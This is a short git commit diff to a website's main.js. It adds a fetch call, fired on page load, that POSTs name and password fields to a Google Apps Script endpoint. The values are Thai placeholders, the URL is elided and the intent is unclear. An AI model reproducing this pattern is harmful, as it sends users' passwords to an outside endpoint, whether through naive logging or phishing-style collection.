678283fe108c004ad827d9a86e76c1260b6c93b9
super-nikorn <136907379+super-nikorn@users.noreply.github.com>
2025-05-15 18:36:45 +0700

    date 150568 time 1836

--- assets/js/main.js
+++ assets/js/main.js
@@ -2,3 +2,11 @@ function toggleMenu() {
   const menu = document.getElementById("dropdown-menu");
   menu.classList.toggle("show");
 }
+
+fetch("https://script.google.com/macros/s/....../exec", {
+  method: "POST",
+  body: new URLSearchParams({
+    name: "ชื่อที่กรอก",
+    password: "รหัสผ่านที่กรอก"
+  })
+})
